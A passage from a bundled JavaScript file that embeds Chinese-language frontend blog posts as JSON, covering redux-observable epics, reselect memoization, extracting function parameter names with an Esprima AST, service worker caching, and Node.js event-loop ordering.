阻止原始的 action 到达 reducers; 该 action 已经通过了它!</p>\\n</blockquote>\\n<p>理解：</p>\\n<p>通过查看redux源码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">dispatch</span>(<span class=\\"hljs-params\\">action</span>) </span>{\\n    <span class=\\"hljs-comment\\">//...一些判断</span>\\n\\n    <span class=\\"hljs-comment\\">// dispatch实际操作（顺序：先更新state，再执行监听）</span>\\n    <span class=\\"hljs-keyword\\">try</span> {\\n      isDispatching = <span class=\\"hljs-literal\\">true</span>\\n      <span class=\\"hljs-comment\\">// 更新currentState</span>\\n      currentState = currentReducer(currentState, action)\\n    } <span class=\\"hljs-keyword\\">finally</span> {\\n      isDispatching = <span class=\\"hljs-literal\\">false</span>\\n    }\\n    <span class=\\"hljs-comment\\">// 遍历执行每一个监听</span>\\n    <span class=\\"hljs-keyword\\">const</span> listeners = (currentListeners = nextListeners)\\n    <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> i = <span class=\\"hljs-number\\">0</span>; i &lt; listeners.length; i++) {\\n      <span class=\\"hljs-keyword\\">const</span> listener = listeners[i]\\n      listener()\\n    }\\n\\n    <span class=\\"hljs-keyword\\">return</span> action\\n  }</code></pre></code></pre>\\n<p>可以看出是先更新state，说明一开始的action已经执行了，然后才去执行listener(即这里的Epics)</p>\\n<h3 id=\\"er\\">二</h3>\\n<p>这里到底发生了什么</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> fetchUser = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">username</span> =&gt;</span> ({ <span class=\\"hljs-attr\\">type</span>: FETCH_USER, <span class=\\"hljs-attr\\">payload</span>: username });\\n<span class=\\"hljs-keyword\\">const</span> fetchUserFulfilled = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">payload</span> =&gt;</span> ({ <span class=\\"hljs-attr\\">type</span>: FETCH_USER_FULFILLED, payload });\\n\\n\\n<span class=\\"hljs-keyword\\">const</span> fetchUserEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.ofType(FETCH_USER)\\n    .mergeMap(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span>\\n      ajax.getJSON(<span class=\\"hljs-string\\">`https://api.github.com/users/<span class=\\"hljs-subst\\">${action.payload}</span>`</span>)\\n        .map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">response</span> =&gt;</span> fetchUserFulfilled(response))\\n    );</code></pre></code></pre>\\n<p>我们用redux的时候写reducer是<code>action</code>入，<code>state</code>出，编写完成后通过<code>combineReducers</code>合并，再通过<code>createStore</code>添加</p>\\n<p>这是一个reducer:</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> users = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">state = {}, action</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">switch</span> (action.type) {\\n    <span class=\\"hljs-keyword\\">case</span> FETCH_USER_FULFILLED:\\n      <span class=\\"hljs-keyword\\">return</span> {\\n        ...state,\\n        <span class=\\"hljs-comment\\">// `login` is the username</span>\\n        [action.payload.login]: action.payload\\n      };\\n\\n    <span class=\\"hljs-keyword\\">default</span>:\\n      <span class=\\"hljs-keyword\\">return</span> state;\\n  }\\n};</code></pre></code></pre>\\n<p>而这里则是编写epic，<code>action$</code>入，<code>action$</code>出，这两个action$流不能是同一个，编写完成后，通过<code>combineEpics</code>合并，\\n再通过<code>createEpicMiddleware</code>创建，最后通过<code>applyMiddleware</code>加入到<code>createStore</code>中</p>\\n<p>这是一个epic:</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> fetchUserEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.ofType(FETCH_USER)\\n    .mergeMap(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span>\\n      ajax.getJSON(<span class=\\"hljs-string\\">`https://api.github.com/users/<span class=\\"hljs-subst\\">${action.payload}</span>`</span>)\\n        .map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">response</span> =&gt;</span> fetchUserFulfilled(response))\\n    );</code></pre></code></pre>\\n<p>因此，解释上面那一段：</p>\\n<pre><code><pre class=\\"hljs\\"><code>// 定义2个cation\\nconst fetchUser = username =&gt; ({ type: FETCH_USER, payload: username });\\nconst fetchUserFulfilled = payload =&gt; ({ type: FETCH_USER_FULFILLED, payload });\\n\\n// 定义一个epic，入口action$为每一个action组成的流\\nconst fetchUserEpic = action$ =&gt;\\n  // 搜索出type为FETCH_USER的action\\n  action$.ofType(FETCH_USER)\\n    // mergeMap方法，简单来说就是将内部源的输出合并到外部源中，然后一起输出\\n    // 再简单说，就是这个epic的出口就是fetchUserFulfilled(response)这个action组成的流\\n    .mergeMap(action =&gt;\\n      ajax.getJSON(`https://api.github.com/users/${action.payload}`)\\n        .map(response =&gt; fetchUserFulfilled(response))\\n    );</code></pre></code></pre><p>然后通过redux-observable源码中<code>result$.subscribe(store.dispatch)</code>，因为store.dispatch是一个接受action的函数（看一），\\n而result$这里就是action组成的流，因此这个订阅实际结果就是<code>store.dispatch(action$流中的每一个action)</code>，真的很精妙！</p>\\n<p>不知道是否说清楚了，感觉还挺绕的，不过通过文档和源码结合也能慢慢缕清思路。</p>\\n","toc":[{"anchor":"yi","level":3,"text":"一"},{"anchor":"er","level":3,"text":"二"}],"relatedTags":null,"created_at":"2018-06-12","timeArr":[2018,5,12,0,0,0,0],"title":"redux-observable笔记1","uuid":"476aa40826f78ed929e4d188e5272ba3b366c415","summary":"<h4>一</h4>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> pingEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.filter(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> action.type === <span class=\\"hljs-string\\">\'PING\'</span>)\\n    .mapTo({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PONG\'</span> });\\n</code></pre>\\n<blockquote>\\n<p>pingEpic 会监听类型为 PING 的 actions，然后投...</p>\\n</blockquote>","slug":"redux-observable-bi-ji-1","sha":"2c3ca78c66c568c2182c1a0a3db4f01790f268e3"}')},633:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"reselect\\">Reselect</h2>\\n<p>当我们使用redux的<code>connect(mapStateToProps)</code>的时候</p>\\n<p>有时候store的数据直接传进组件并不好，于是我们希望在将数据传进组件前，进行调整</p>\\n<p>例如 store如下</p>\\n<pre><code><pre class=\\"hljs\\"><code>const mockStore={\\n  descriptions:[\\n    {name:&quot;a&quot;,age:25},\\n    {name:&quot;b&quot;,age:38},\\n    {name:&quot;c&quot;,age:26}\\n  ]\\n}</code></pre></code></pre><p>我们希望传进组件的数据如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n  descriptions:{\\n    name:[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;],\\n    age:[25,38,26]\\n  }\\n}</code></pre></code></pre><p>通常的办法：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> mapStateToProps=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">state</span>)=&gt;</span>{\\n  <span class=\\"hljs-keyword\\">const</span> newDescriptions={}\\n  state.descriptions.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">obj</span>)=&gt;</span>{\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">in</span> obj){\\n      <span class=\\"hljs-keyword\\">if</span>(obj.hasOwnProperty(key)){\\n        <span class=\\"hljs-keyword\\">if</span>(!newDescriptions[key]){\\n          newDescriptions[key]=[]\\n        }\\n        newDescriptions[key].push(obj[key])\\n      }\\n    }\\n  })\\n  <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">descriptions</span>:newDescriptions}\\n}\\n<span class=\\"hljs-built_in\\">console</span>.log(mapStateToProps(mockStore)===mapStateToProps(mockStore))\\n<span class=\\"hljs-comment\\">// false</span></code></pre></code></pre>\\n<p>缺陷：很明显这里每次执行都会返回一个全新的对象，因此redux的浅对比就会失效，造成多次重复渲染</p>\\n<p>使用reselect</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> {createSelector} <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'reselect\'</span>\\n\\n<span class=\\"hljs-keyword\\">const</span> selectState=createSelector(\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">state</span>=&gt;</span>state.descriptions,\\n  descriptions=&gt;{\\n    <span class=\\"hljs-keyword\\">const</span> newDescriptions={}\\n    descriptions.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">obj</span>)=&gt;</span>{\\n      <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">in</span> obj){\\n        <span class=\\"hljs-keyword\\">if</span>(obj.hasOwnProperty(key)){\\n          <span class=\\"hljs-keyword\\">if</span>(!newDescriptions[key]){\\n            newDescriptions[key]=[]\\n           }\\n           newDescriptions[key].push(obj[key])\\n        }\\n      }\\n    })\\n    <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">descriptions</span>:newDescriptions}\\n  }\\n)\\n<span class=\\"hljs-built_in\\">console</span>.log(selectState(mockStore)===selectState(mockStore))\\n<span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n<p>通过测试，会发现，每次的返回值都是引用相等的(===)，原因是因为reselect内部使用了缓存，\\n当参数(mockStore)相同，直接返回缓存的结果</p>\\n<p>注意：比较参数是建立在我们编写<em>纯函数</em>的基础上，如果内部不是纯函数，但参数相同，也会返回缓存值，就很可能会造成意外的bug</p>\\n<p><a href=\\"https://gist.github.com/stonehank/c5de2a4318ee9954503770047c998c7b\\">详细代码</a></p>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reselect/README.md\\">更多关于reselect的学习</a></p>\\n","toc":[{"anchor":"reselect","level":2,"text":"Reselect"}],"relatedTags":null,"created_at":"2018-06-28","timeArr":[2018,5,28,0,0,0,0],"title":"reselect","uuid":"e28099171dfe31f2da457cda1c3b45aac1715cd2","summary":"<h4>Reselect</h4>\\n<p>当我们使用redux的<code>connect(mapStateToProps)</code>的时候</p>\\n<p>有时候store的数据直接传进组件并不好，于是我们希望在将数据传进组件前，进行调整</p>\\n<p>例如 store如下</p>\\n<pre class=\\"hljs\\"><code>const mockStore={\\n  descriptions:[\\n    {name:&quot;a...</code></pre>","slug":"reselect","sha":"f0d4f2e822ae9afefb2da674e748cd479eef8231"}')},634:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"xie-zai-zui-qian\\">写在最前</h3>\\n<p>最近项目有个需求，获取函数参数名，听起来很简单，但有了ES6，参数和函数写法千奇百怪，在github上大概看了几个库，基本上都是正则，\\n对通用的写法能够覆盖，稍微越过边界，往往无法正确匹配。</p>\\n<p>于是就有了使用<code>AST</code>去进行覆盖查找的想法。</p>\\n<h3 id=\\"gai-nian\\">概念</h3>\\n<p>抽象语法树（abstract syntax tree或者缩写为AST），或者语法树（syntax tree），是源代码的抽象语法结构的树状表现形式。</p>\\n<hr>\\n<h3 id=\\"wei-shen-mo-yao-yong-ast\\">为什么要用AST</h3>\\n<p>通过AST，我们可以对代码进行查找，看起来好像正则表达式也可以做到，那么为什么要用AST而不用正则？</p>\\n<p>就说从函数获取参数名，夸张点，如果有以下表达式：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">x</span>(<span class=\\"hljs-params\\">a=<span class=\\"hljs-number\\">5</span>,b=<span class=\\"hljs-string\\">\\"a\\"</span>,c=function(x=<span class=\\"hljs-number\\">1</span>,y</span>)</span>{<span class=\\"hljs-built_in\\">console</span>.log(x=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">i=<span class=\\"hljs-number\\">8</span>,j</span>)</span>{})},d={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-string\\">\'x=6\'</span>},e=<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">x</span>=&gt;</span><span class=\\"hljs-number\\">7</span>,f=[<span class=\\"hljs-string\\">\'3=5\'</span>,<span class=\\"hljs-string\\">\'x.1\'</span>,<span class=\\"hljs-string\\">\'y,2\'</span>,<span class=\\"hljs-number\\">1</span>],g=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">x,y</span>)=&gt;</span>{<span class=\\"hljs-keyword\\">let</span> z=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">i,j=<span class=\\"hljs-number\\">6</span></span>)=&gt;</span>{}},h){}</code></pre></code></pre>\\n<p><code>参数是[a,b,c,d,e,f,g,h]</code></p>\\n<p>你确定还想用正则去匹配参数名称吗...</p>\\n<blockquote>\\n<p>AST是从代码的意义去编辑，而正则只能从代码的字面去编辑。</p>\\n</blockquote>\\n<p>以上夸张的函数，使用AST去分析，可以很轻松获取它的参数名。</p>\\n<hr>\\n<h3 id=\\"esprima\\">Esprima</h3>\\n<p>我们使用<a href=\\"http://esprima.org/demo/parse.html#\\">esprima</a>，一个可以将Javascript代码解析成抽象树的库。</p>\\n<p>首先我们需要安装它：</p>\\n<p><code>npm install esprima</code></p>\\n<p>接着调用：</p>\\n<p><code>const esprima=require(&#39;require&#39;&#39;)</code></p>\\n<p>接下来就是分析的时候了。</p>\\n<hr>\\n<h3 id=\\"yi-ge-jian-dan-de-ast-li-zi\\">一个简单的AST例子</h3>\\n<p>先来个简单的例子：\\n<code>function a(b){}</code></p>\\n<p>通过esprima解析后，生成结构图如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n    &quot;type&quot;: &quot;Program&quot;,\\n    &quot;body&quot;: [\\n        {   // 这个type表示这是一个函数表达式\\n            &quot;type&quot;: &quot;FunctionDeclaration&quot;,\\n            &quot;id&quot;: {\\n                &quot;type&quot;: &quot;Identifier&quot;,\\n                &quot;name&quot;: &quot;a&quot;\\n            },\\n            &quot;params&quot;: [\\n                {\\n                    // 参数数组内的Identifier代表参数\\n                    &quot;type&quot;: &quot;Identifier&quot;,\\n                    &quot;name&quot;: &quot;b&quot;\\n                }\\n            ],\\n            &quot;body&quot;: {\\n                &quot;type&quot;: &quot;BlockStatement&quot;,\\n                &quot;body&quot;: []\\n            },\\n            &quot;generator&quot;: false,\\n            &quot;expression&quot;: false,\\n            &quot;async&quot;: false\\n        }\\n    ],\\n    &quot;sourceType&quot;: &quot;script&quot;\\n}</code></pre></code></pre><p>思路：</p>\\n<ol>\\n<li><code>FunctionDeclaration</code>说明是一个函数表达式，进入<code>params</code>属性。</li>\\n<li>判断<code>params</code>中每一个的type是否为<code>Identifier</code>，在<code>params</code>属性下的<code>Identifier</code>就代表是参数。</li>\\n<li>找出name属性的值，结果为<code>[&#39;b&#39;]</code>。</li>\\n</ol>\\n<p>根据以上思路，我们可以写出一个简单的获取参数的方法了。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">getParams</span>(<span class=\\"hljs-params\\">fn</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 此处分析的代码必须是字符串</span>\\n  <span class=\\"hljs-keyword\\">let</span> astEsprima=esprima.parseScript(fn.toString())\\n  <span class=\\"hljs-keyword\\">let</span> funcParams = []\\n  <span class=\\"hljs-keyword\\">let</span> node = astEsprima.body[<span class=\\"hljs-number\\">0</span>]\\n  <span class=\\"hljs-comment\\">// 找到type，进入params属性</span>\\n  <span class=\\"hljs-keyword\\">if</span> (node.type === <span class=\\"hljs-string\\">\\"FunctionDeclaration\\"</span>) funcParams = node.params\\n  <span class=\\"hljs-keyword\\">let</span> validParam=[]\\n  funcParams.forEach(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">obj</span>=&gt;</span>{\\n    <span class=\\"hljs-keyword\\">if</span>(obj.type===<span class=\\"hljs-string\\">\\"Identifier\\"</span>)\\n      validParam.push(obj.name)\\n  })\\n  <span class=\\"hljs-keyword\\">return</span> validParam\\n}</code></pre></code></pre>\\n<p>测试一番，获取结果<code>[&quot;b&quot;]</code>，庆祝收工。</p>\\n<p>好吧，别高兴太早了，要知道函数的创建方法不下10种，而参数写法又有好几种...</p>\\n<p>以下是一部分的函数创建方法和参数写法</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">a</span>(<span class=\\"hljs-params\\">x</span>)</span>{}\\n\\n<span class=\\"hljs-comment\\">// 注意：第二条和第三条在AST中意义不同</span>\\n<span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">x=<span class=\\"hljs-number\\">1</span></span>)</span>{}\\n\\na=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">...x</span>)</span>{}\\n\\n<span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">[x]=[<span class=\\"hljs-number\\">1</span>]</span>)=&gt;</span>{}\\n\\n<span class=\\"hljs-keyword\\">async</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">a</span>(<span class=\\"hljs-params\\">x</span>)</span>{}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> *<span class=\\"hljs-title\\">a</span>(<span class=\\"hljs-params\\">x</span>)</span>{}\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">a</span></span>{\\n<span class=\\"hljs-keyword\\">constructor</span>(x){}\\n}\\n\\n<span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Function</span> (<span class=\\"hljs-string\\">\'x\'</span>,<span class=\\"hljs-string\\">\'console.log(x)\'</span>)\\n\\n(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">x</span>)</span>{}})()\\n\\n<span class=\\"hljs-built_in\\">eval</span>(<span class=\\"hljs-string\\">\\"(function(){return function(a,b){}})()\\"</span>)</code></pre></code></pre>\\n<p>有什么想法？如果你有发出&quot;我K&quot;的想法，那说明我这个装逼还算成功- -...</p>\\n<p>其实只需要分几种情况(很多写法的type都是一致的)，就可以完全渗入到以上所有的参数对象内部，再进行参数获取就是循环+判断解决的事了。</p>\\n<p>由于篇幅问题，这里不一一分析，只是将AST分析树所用的type和一些注意点。</p>\\n<h3 id=\\"han-shu-jie-gou\\">函数结构</h3>\\n<h4 id=\\"bian-liang-sheng-ming-yu-ju-he-biao-da-shi-yu-ju\\">变量声明语句和表达式语句</h4>\\n<p>上面注释中<code>let a=function(x=1){}</code>和<code>a=function(...x){}</code>是两种意义。</p>\\n<p>其中<code>let a=function(x=1){}</code>指的是变量声明语句，</p>\\n<p>对应的type是<code>VariableDeclaration</code>，需要进入它的初始值<code>init</code>就可以获取到函数所在的语法对象，它的type是<code>FunctionExpression</code>函数表达式，再去<code>params</code>中查找即可。</p>\\n<p>变量声明语句：</p>\\n<pre><code><pre class=\\"hljs\\"><code>├──VariableDeclaration....init\\n        ├──FunctionExpression.params</code></pre></code></pre><p>而<code>a=function(...x){}</code>是表达式语句，</p>\\n<p>对应的type是<code>ExpressionStatement</code>，需要进入它的表达式<code>expression</code>获取到表达式内部，这时我们要进入赋值表达式(<code>type为AssignmentExpression</code>)的右边(<code>right属性</code>)，\\n获取函数所在的语法对象，它的type同样也是<code>FunctionExpression</code>函数表达式。</p>\\n<p>表达式语句：</p>\\n<pre><code><pre class=\\"hljs\\"><code>├──ExpressionStatement.expression\\n        ├──AssignmentExpression.right\\n                ├──FunctionExpression.params</code></pre></code></pre><h4 id=\\"class-sheng-ming-he-function-gou-zao-han-shu\\">class声明和Function构造函数</h4>\\n<p>class声明对应的type有<code>ClassDeclaration</code>(class xx{...})或者<code>ClassExpression</code>(let x=class{...})，他们一个是声明一个是表达式，处理方式是相同的，\\n进入对象内部，找到kind为<code>constructor</code>的对象，获取参数数据。</p>\\n<p>class声明语句：</p>\\n<pre><code><pre class=\\"hljs\\"><code>├──ClassDeclaration...body...\\n        ├──{kind:constructor}\\n                ├──FunctionExpression.params</code></pre></code></pre><p>Function构造函数对应的type是<code>NewExpression</code>或者<code>ClassExpression</code>，参数在属性<code>arguments</code>内部，但是Function的参数都是字符串，\\n而且最后一个参数一定是函数内部语句，因此对于Function构造函数，就是对字符串进行处理。</p>\\n<p>Function构造函数</p>\\n<pre><code><pre class=\\"hljs\\"><code>├──NewExpression.arguments\\n        ├──{value:&lt;String&gt;}\\n         ----&gt;对字符串进行处理，分割参数</code></pre></code></pre><h4 id=\\"jian-tou-han-shu\\">箭头函数</h4>\\n<p>箭头函数type是<code>ArrowFunctionExpression</code>，也仅仅是名称不同，内部结构几乎一致。</p>\\n<p>函数结构的type就到此。</p>\\n<h3 id=\\"can-shu-jie-gou\\">参数结构</h3>\\n<p>参数的type有以下：</p>\\n<p><code>Identifier</code>：最终我们需要获取的参数值的type</p>\\n<p><code>Property</code>：当存在解构参数，例如<code>[a,b] or {x,y}</code></p>\\n<p><code>ArrayPattern</code>：存在解构参数并且是数组，例如<code>[a,b]</code></p>\\n<p><code>ObjectPattern</code>：存在解构参数并且是对象，例如<code>{x,y}</code></p>\\n<p><code>RestElement</code>：存在扩展运算符，例如<code>(...args)</code></p>\\n<p>我们只需要设置一个递归循环，思路和上面一样，一层进入另一层，在内部进行查找。</p>\\n<h3 id=\\"zong-jie\\">总结</h3>\\n<p>篇幅有限，就写这么多，接着做一个总结。</p>\\n<p>这篇讲的主旨只有1个，通过对AST树中每一个对象的type分析，type表示的是对应的代码的意义，也是代码的语义，例如</p>\\n<p><code>VariableDeclaration</code>内部一定会有<code>init</code>，为什么，因为变量声明是有初始值的，如果你不设置，那么就为<code>undefined</code></p>\\n<p>type远不止这次说的这么多，官网(或者Google)上有详细介绍。</p>\\n<hr>\\n<h3 id=\\"zui-hou\\">最后</h3>\\n<p><a href=\\"https://github.com/stonehank/get-function-params-with-ast\\"><code>AST获取函数参数</code>源代码在此</a>。</p>\\n<p>如果本文对你有所帮助，欢迎STAR，或者你对此有什么更好的想法，欢迎留言！</p>\\n<p>最重要如果发现了BUG或者漏匹配，请一定要告知(Issue/PR/留言)，感激不尽！</p>\\n","toc":[{"anchor":"xie-zai-zui-qian","level":3,"text":"写在最前"},{"anchor":"gai-nian","level":3,"text":"概念"},{"anchor":"wei-shen-mo-yao-yong-ast","level":3,"text":"为什么要用AST"},{"anchor":"esprima","level":3,"text":"Esprima"},{"anchor":"yi-ge-jian-dan-de-ast-li-zi","level":3,"text":"一个简单的AST例子"},{"anchor":"han-shu-jie-gou","level":3,"text":"函数结构"},{"anchor":"bian-liang-sheng-ming-yu-ju-he-biao-da-shi-yu-ju","level":4,"text":"变量声明语句和表达式语句"},{"anchor":"class-sheng-ming-he-function-gou-zao-han-shu","level":4,"text":"class声明和Function构造函数"},{"anchor":"jian-tou-han-shu","level":4,"text":"箭头函数"},{"anchor":"can-shu-jie-gou","level":3,"text":"参数结构"},{"anchor":"zong-jie","level":3,"text":"总结"},{"anchor":"zui-hou","level":3,"text":"最后"}],"relatedTags":null,"created_at":"2018-09-18","timeArr":[2018,8,18,0,0,0,0],"title":"如何通过AST树去获取函数参数名","uuid":"ddc3d1d8d6334cc464eb634a0d813d48c0d48776","summary":"<h4>写在最前</h4>\\n<p>最近项目有个需求，获取函数参数名，听起来很简单，但有了ES6，参数和函数写法千奇百怪，在github上大概看了几个库，基本上都是正则，\\n对通用的写法能够覆盖，稍微越过边界，往往无法正确匹配。</p>\\n<p>于是就有了使用<code>AST</code>去进行覆盖查找的想法。</p>\\n<h4>概念</h4>\\n<p>抽象语法树（abstract synta...</p>","slug":"ru-he-tong-guo-AST-shu-qu-huo-qu-han-shu-can-shu-ming","sha":"a7854a9c9c9dd7722bb525311af632ee5752fe47"}')},635:function(n){n.exports=JSON.parse('{"content":"<p>service worker和cache</p>\\n<p>客户端：register</p>\\n<p>服务端：install, activate, fetch</p>\\n<ul>\\n<li><code>install</code></li>\\n</ul>\\n<p>主要作用是内部回调中的参数<code>event</code>的方法<code>event.waitUntil</code>中缓存本次的资源。</p>\\n<ul>\\n<li><code>activate</code></li>\\n</ul>\\n<p>主要作用是在内部回调中的参数<code>event</code>的方法<code>event.waitUntil</code>中清除当前不需要的缓存，并且通知当前已经准备好接受控制。</p>\\n<ul>\\n<li><code>fetch</code></li>\\n</ul>\\n<p>控制阶段，在内部回调参数<code>event</code>的方法<code>event.reponseWith</code>中可以修改响应值</p>\\n<hr>\\n<p>额外：</p>\\n<ul>\\n<li><p><code>waitUntil</code>可以延长promise的生命周期</p>\\n</li>\\n<li><p><code>caches</code>是cacheStorage的调用值，<code>promise</code>的形式</p>\\n</li>\\n</ul>\\n<p>主要用于缓存response(同源)</p>\\n<p><code>caches.open</code> 打开缓存，如果没有就创建，返回promise</p>\\n<p>例如：<code>caches.open(...).then(cache=&gt;cache.add(&quot;url&quot;)</code></p>\\n<p><code>caches.keys</code> 遍历缓存，返回一个数组promise</p>\\n<p><code>caches.match(url)</code> 找到并且返回一个resolve这个匹配的url的promise，找不到返回undefined</p>\\n<p><code>caches.has</code> 查找是否存在Cache对象，找到返回true的promise，否则返回false的promise</p>\\n<p><code>caches.delete</code> 找到Cache对象则删除，返回true的promise，否则返回false的promise</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-26","timeArr":[2018,8,26,0,0,0,0],"title":"service-worker要点概括","uuid":"39277c1a6e1a6c2280d116793ed086ee2507fa7e","summary":"<p>service worker和cache</p>\\n<p>客户端：register</p>\\n<p>服务端：install, activate, fetch</p>\\n<ul>\\n<li><code>install</code></li>\\n</ul>\\n<p>主要作用是内部回调中的参数<code>event</code>的方法<code>event.waitUntil</code>中缓存本次的资源。</p>\\n<ul>\\n<li><code>activate</code></li>\\n</ul>\\n<p>主要作用是在内部回调中的参数`e...</p>","slug":"service-worker-yao-dian-gai-kuo","sha":"e35e017c1e99651fcf6cabf2e7873c3ad59e795c"}')},636:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"chu-fa-su-du-pai-xu\\">触发速度排序</h3>\\n<p><code>nextTick</code> → <code>Promise</code> → <code>setTimeout</code> → <code>setImmediate</code></p>\\n<h3 id=\\"guan-yu-wei-ren-wu-dui-lie\\">关于<code>微任务队列</code></h3>\\n<p>每当JS执行栈为空，会立刻检查<code>微任务队列</code>，当发现队列存在任务，立即执行，执行完毕，栈为空，继续检测...</p>\\n<h3 id=\\"guan-yu-nexttick-dui-lie\\">关于<code>nextTick队列</code></h3>\\n<p>在<code>node v11.0.0</code>之前，<code>nextTick</code>会等待队列中任务全部完成，采取执行，</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>process.nextTick(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">1</span>)\\n  setImmediate(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">2</span>)\\n  })\\n})\\n\\nsetImmediate(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">3</span>)\\n  process.nextTick(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">4</span>)\\n  })\\n})</code></pre></code></pre>\\n<p>在旧版<code>node</code>中，结果是<code>1324</code>，这是因为当执行完<code>3</code>，<code>Immediate队列</code>还有任务，因此<code>nextTick</code>会等待任务完成才执行。</p>\\n<p>而在新版<code>node</code>中，结果是<code>1342</code>，因为<code>nextTick</code>不必等待所有任务执行完毕，而只是等待单个<code>Immediate</code>或者<code>Timer</code>完成，便会检查触发。</p>\\n<blockquote>\\n<p>In order to better match browser behaviour, run nextTicks (and subsequently the microtask queue) after each individual Timer and Immediate, rather than after the whole list is processed. The current behaviour is somewhat of a performance micro-optimization and also partly dictated by how timer handles were implemented.</p>\\n</blockquote>\\n<p>来自：<a href=\\"https://github.com/nodejs/node/pull/22842#issue-215309787\\">https://github.com/nodejs/node/pull/22842#issue-215309787</a></p>\\n<h3 